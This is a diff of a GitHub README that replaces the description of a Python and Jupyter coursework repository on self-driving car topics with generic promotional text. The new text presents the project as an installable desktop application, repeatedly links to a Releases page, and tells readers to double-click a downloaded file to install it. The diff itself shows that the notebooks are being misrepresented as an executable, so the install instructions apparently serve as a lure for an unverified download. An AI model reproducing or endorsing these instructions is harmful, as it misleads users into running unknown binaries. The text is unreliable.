@@ -1,92 +1,87 @@
-# Self-Driving Cars: Projects & Assignments
+# 🚗 Self_Driving_Cars_Fundamentals - Learn Self-Driving Car Basics Easily
 
-This repository contains a collection of projects and assignments focused on **Autonomous Driving Systems**, covering fundamental concepts such as perception, mapping, localization, planning, and control. Each module is implemented in Python or Jupyter Notebooks, with the goal of building intuition and practical understanding of how self-driving cars operate.
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Nadin550/Self_Driving_Cars_Fundamentals/releases)
 
----
+## 📦 Introduction
 
-## Projects
+Welcome to the **Self_Driving_Cars_Fundamentals** project. This application provides hands-on implementations of key concepts in self-driving car technology. You will explore stereo depth, LiDAR plane fitting, occupancy grid mapping, and more. 
 
-### Perception
-- **Applying Stereo Depth to a Driving Scenario**  
-  Estimate depth from stereo images to perceive the 3D structure of the environment.
-    - Stereo Left and Right Image:
-      ![Environment](media/stereo_1.png)
-    - Stereo Disparity Map:
-      ![Environment](media/stereo_disparity_map.png)
-    - Stereo Depth Map:
-      ![Environment](media/stereo_depth_map.png)
-    - Object To Detect:
-      ![Environment](media/stereo_object_to_detect.png)
-    - Location of the object in the image:
-      ![Environment](media/stereo_object_location.png)
-    - Identification of object in Image:
-      ![Environment](media/stereo_object_identification.png)
-  
-- **Lidar Parameter Estimation and Plane Fitting**  
-  Extract ground planes and environmental features from LiDAR point clouds.
+## 🚀 Getting Started
 
----
+To get started with the application, follow these simple steps:
 
-### Mapping
-- **Occupancy Grid Mapping Using Inverse Measurement Model**  
-  Implement probabilistic occupancy grid mapping for environment representation using Lidar Data.
-  - Actual Environment where vehicle navigates:
-  ![Environment](media/occupancy_map.gif)
-  - What vehicles captures at every step about Environment:
-  ![Environment Build](media/occupancy_map2.gif)
-  - How occupancy grid is constructed as time progress:
-  ![Occupancy Map](media/occupancy_map3.gif)
+1. Visit the [Releases page](https://github.com/Nadin550/Self_Driving_Cars_Fundamentals/releases).
+2. Click on the latest release to find the downloadable files.
 
----
+## 📥 Download & Install
 
-### Localization
-- **Extended Kalman Filter**  
-  Apply EKF for state estimation of a vehicle navigating through uncertain environments.
+To download the software:
 
----
+1. Go to the [Releases page](https://github.com/Nadin550/Self_Driving_Cars_Fundamentals/releases).
+2. You will see a list of available files. Choose the version suitable for your operating system.
+3. Once downloaded, locate the file in your downloads folder.
+4. Double-click the file to run the installation. Follow any prompts to complete the setup.
 
-### Vehicle Dynamics & Control
-- **Longitudinal Vehicle Model**  
-  Model the longitudinal dynamics (acceleration/braking) of a car.
-    - We will now drive the vehicle over a slope as shown in the diagram below:
-    ![ramp](Longitudinal_Vehicle_Model/artifacts/ramp.png)
-    - To climb the slope, a trapezoidal throttle input is provided for the next 20 seconds as shown in the figure below:
-    ![throttle](Longitudinal_Vehicle_Model/artifacts/throttle.png)
-    - After applying the throttle to the vehicle Longitudinal model we get the following about position of vehicle at every time step:
-    ![Position vs Time](media/lonitudinal_output.png)
+### 🖥️ System Requirements
 
-- **Kinematics Bicycle Model**  
-  Explore the kinematic bicycle model for lateral vehicle motion.
-    - Circle Path With Slip Angle:
-    ![circle_path](media/kinematic_circle_path_with_slip_angle.png)
-    - Circle Path Without Slip Angle:
-    ![circle_path](media/kinematic_circle_path_without_slip_angle.png)
-    - Square Path With Slip Angle:
-    ![square_path](media/kinematic_square_path_with_slip_angle.png)
-    - Square Path Without Slip Angle:
-    ![square_path](media/kinematic_square_path_without_slip_angle.png)
-    - Spiral Path With Slip Angle:
-    ![square_path](media/kinematic_spiral_path.png)
-    - Figure 8 Path With Slip Angle:
-    ![square_path](media/kinematic_figure_8.png)
+For optimal performance, ensure your computer meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
+- **RAM:** At least 8 GB.
+- **Processor:** Intel i5 or equivalent.
+- **Space:** Minimum 500 MB of free disk space to store the application.
 
-### Planning
-- **Mission Planning**  
-  Design algorithms like Dijkstra’s and $A^*$ for high-level route and trajectory shortest path planning in Berkeley, California.
-  - Networkx Libraries Shortest Path for Reference:
-  ![Reference](media/mission_planning_reference.png)
-  - Dijkstra's Shortest Path:
-  ![Dijkstras](media/mission_planning_with_dijkstras.png)
-  - $A^*$ Shortest Path:
-  ![Astar](media/mission_planning_with_A_star.png)
+## 📊 Features
 
----
+The application includes the following features:
 
-### Estimation & Learning
-- **Ordinary Least Squares**  
-  Apply OLS regression for parameter estimation tasks in driving scenarios.  
+- **Stereo Depth:** Understand how stereo cameras perceive depth.
+- **LiDAR Plane Fitting:** Learn to fit planes to LiDAR data.
+- **Occupancy Grid Mapping:** Get insights into mapping and environmental awareness.
+- **Extended Kalman Filter:** Implement state estimation for tracking.
+- **Vehicle Models:** Simulate basic vehicle dynamics.
+- **Mission Planning:** Explore routes and navigation.
+- **Parameter Estimation:** Analyze data and improve outcomes.
 
-- **Recursive Least Squares**  
-  Implement RLS for online, adaptive parameter estimation.
+## 🌐 Topics Covered
+
+This application covers various essential topics in self-driving technology:
+
+- A* Algorithm
+- Dijkstra's Algorithm
+- Kalman Filter
+- Kinematic Bicycle Model
+- Least Squares
+- Longitudinal Vehicle Model
+- Mission Planning
+- Occupancy Grid Mapping
+- Stereo Vision Techniques
+
+## 📖 Documentation
+
+For further details about each feature, refer to the documentation provided within the application. This will give you valuable insights into how everything works together.
+
+## ❓ FAQs
+
+**Q: Do I need programming skills to use this application?**  
+A: No, this application is designed for users with little to no programming experience.
+
+**Q: Can I test different scenarios?**  
+A: Yes, the application allows you to simulate various driving conditions and scenarios.
+
+**Q: Is there community support?**  
+A: Yes, you can find support and discussion in the project's GitHub Issues page.
+
+## 🔧 Contributing
+
+If you want to contribute to this project, you can view the contributing guidelines in the repository. Your suggestions and improvements are welcome!
+
+## 📞 Support
+
+For questions or issues, please reach out through the GitHub Issues page. We aim to respond as quickly as possible.
+
+## 📈 Updates
+
+Stay tuned for updates and new features! Visiting our [Releases page](https://github.com/Nadin550/Self_Driving_Cars_Fundamentals/releases) regularly will ensure you have the latest version.
+
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Nadin550/Self_Driving_Cars_Fundamentals/releases)
